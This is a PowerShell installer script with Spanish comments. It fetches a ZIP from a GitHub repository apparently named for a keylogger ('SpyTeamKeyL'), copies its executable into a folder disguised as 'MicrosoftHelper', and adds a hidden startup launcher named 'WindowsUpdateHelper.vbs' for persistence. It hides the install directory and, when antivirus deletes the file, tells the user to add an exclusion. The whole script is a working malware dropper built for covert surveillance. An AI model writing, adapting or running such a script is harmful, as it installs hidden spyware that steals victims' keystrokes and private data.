# 1. Definir rutas y limpiar temporales anteriores
$url = "https://github.com/Galavic/SpyTeamKeyL/raw/refs/heads/main/spkl.zip"
$baseDir = "$env:TEMP\spkl_install"
$zipPath = "$baseDir\paquete.zip"

# Variables de Instalación
$InstallDir = "$env:LocalAppData\MicrosoftHelper"
$SourceDirName = "ProcessWin32"
$ExeName = "ProcessWin32.exe"
# $TargetBatName NO SE USA MÁS
$StartupDir = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
$StartupVbs = "WindowsUpdateHelper.vbs"

# Función para borrar carpetas de forma agresiva
function Force-RemoveDir($path) {
    if (Test-Path $path) {
        Write-Host " - Eliminando: $path" -ForegroundColor DarkGray
        # Método 1: PowerShell
        try { Remove-Item $path -Recurse -Force -ErrorAction Stop } catch { }
        # Método 2: Si aún existe, usar cmd
        if (Test-Path $path) {
            cmd /c "rd /s /q `"$path`"" 2>$null
            Start-Sleep -Milliseconds 500
        }
        # Método 3: Si TODAVÍA existe, vaciar contenido
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        }
    }
}

# Limpiar TODAS las carpetas temporales anteriores (nombre viejo y nuevo)
Write-Host "Limpiando temporales anteriores..." -ForegroundColor Cyan
Force-RemoveDir "$env:TEMP\spk1_install"   # nombre viejo (con número 1)
Force-RemoveDir "$env:TEMP\spkl_install"   # nombre actual (con letra L)

# Crear directorio temporal limpio
New-Item -ItemType Directory -Path $baseDir -Force | Out-Null

# 2. Descargar el ZIP
try {
    Write-Host "Descargando archivos..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
} catch {
    Write-Host "Error en la descarga: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Presiona Enter para salir"
    exit
}

# 3. Extraer el ZIP (con -Force para sobreescribir archivos existentes)
try {
    Write-Host "Extrayendo..." -ForegroundColor Cyan
    Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force
} catch {
    Write-Host "Error al extraer: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Presiona Enter para salir"
    exit
}

# 4. INSTALACIÓN AUTOMÁTICA (Sin run.bat)
try {
    Write-Host "Instalando..." -ForegroundColor Cyan

    # A. Buscar archivos fuente (Solo la carpeta del programa)
    Write-Host " - Buscando componentes..."
    $allExtracted = Get-ChildItem -Path $baseDir -Recurse
    
    # 1. Buscar carpeta ProcessWin32
    $extractedSource = $allExtracted | Where-Object { $_.PSIsContainer -and $_.Name -eq $SourceDirName } | Select-Object -First 1

    # 2. Fallback: Si no encuentra la carpeta, buscar el EXE y usar su directorio padre
    if (-not $extractedSource) {
        $exe = $allExtracted | Where-Object { $_.Name -eq $ExeName } | Select-Object -First 1
        if ($exe) { 
            Write-Host "   (Carpeta detectada via EXE)" -ForegroundColor DarkGray
            $extractedSource = $exe.Directory 
        }
    }

    # Verificación
    if (-not $extractedSource) {
        Write-Host "ERROR CRÍTICO: Carpeta/Executable '$SourceDirName' faltante." -ForegroundColor Red
        Write-Host "`n--- CONTENIDO EXTRAÍDO ($baseDir) ---" -ForegroundColor Gray
        $allExtracted | Select-Object FullName | Format-Table -AutoSize -HideTableHeaders
        Write-Host "-------------------------------------`n"
        throw "Archivos fuente requeridos no encontrados en el ZIP."
    }

    # B. Detener proceso si ya existe
    $proc = Get-Process -Name "ProcessWin32" -ErrorAction SilentlyContinue
    if ($proc) { 
        Write-Host " - Deteniendo proceso anterior..." -ForegroundColor Yellow
        Stop-Process -Name "ProcessWin32" -Force 
    }

    # C. Preparar Directorio (Limpiar si existe para update limpio)
    if (Test-Path $InstallDir) {
        Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null

    # D. Copiar Archivos
    Write-Host " - Copiando archivos..."
    Copy-Item -Path $extractedSource.FullName -Destination "$InstallDir\$SourceDirName" -Recurse -Force

    # E. Configurar Persistencia (VBS apunta directo al EXE)
    Write-Host " - Configurando persistencia..."
    $vbsPath = "$StartupDir\$StartupVbs"
    $exePath = "$InstallDir\$SourceDirName\$ExeName"
    
    # Script VBS que lanza el EXE de forma oculta (0)
    $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
strPath = "$exePath"
WshShell.Run chr(34) & strPath & chr(34), 0, False
"@
    Set-Content -Path $vbsPath -Value $vbsContent

    # F. Ocultar carpeta de instalación
    Write-Host " - Ocultando instalación..."
    if (Test-Path $InstallDir) {
        try {
            # Intento 1: PowerShell nativo
            $item = Get-Item -Path $InstallDir -ErrorAction Stop
            $item.Attributes = 'Hidden'
        } catch {
            # Intento 2: Comando attrib (Fallback)
            Write-Host "   (Usando fallback attrib)" -ForegroundColor DarkGray
            Start-Process -FilePath "attrib.exe" -ArgumentList "+h `"$InstallDir`"" -NoNewWindow -Wait
        }
    } else {
        Write-Host " [!] ADVERTENCIA: La carpeta de instalación desapareció antes de finalizar." -ForegroundColor Red
        Write-Host " Esto suele indicar que un ANTIVIRUS eliminó los archivos." -ForegroundColor Yellow
        # No salimos con error fatal para permitir que intente ejecutar lo que quede
    }

    # G. Verificar que el EXE existe antes de ejecutar
    Write-Host " - Verificando archivos..." -ForegroundColor Cyan
    if (-not (Test-Path $exePath)) {
        Write-Host ""
        Write-Host "==========================================" -ForegroundColor Red
        Write-Host " [!] ERROR: El archivo '$ExeName' fue eliminado." -ForegroundColor Red
        Write-Host " Esto suele ser causado por el ANTIVIRUS." -ForegroundColor Yellow
        Write-Host "" 
        Write-Host " SOLUCION: Agrega una exclusion en tu antivirus" -ForegroundColor Yellow
        Write-Host " para la carpeta:" -ForegroundColor Yellow
        Write-Host "   $InstallDir" -ForegroundColor White
        Write-Host " Y luego ejecuta este script de nuevo." -ForegroundColor Yellow
        Write-Host "==========================================" -ForegroundColor Red
        Write-Host ""
        Read-Host "Presiona Enter para salir"
        exit
    }

    # H. Ejecutar Servicio
    Write-Host " - Iniciando servicio..." -ForegroundColor Green
    if (Test-Path $vbsPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
        Write-Host "[OK] Instalación completada exitosamente." -ForegroundColor Green
    } else {
        Write-Host " [!] ERROR: No se encontró el script de inicio ($vbsPath)." -ForegroundColor Red
    }


} catch {
    Write-Host "Error durante la instalación: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Presiona Enter para salir"
    exit
}

# Limpieza final
# Remove-Item $baseDir -Recurse -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2
exit
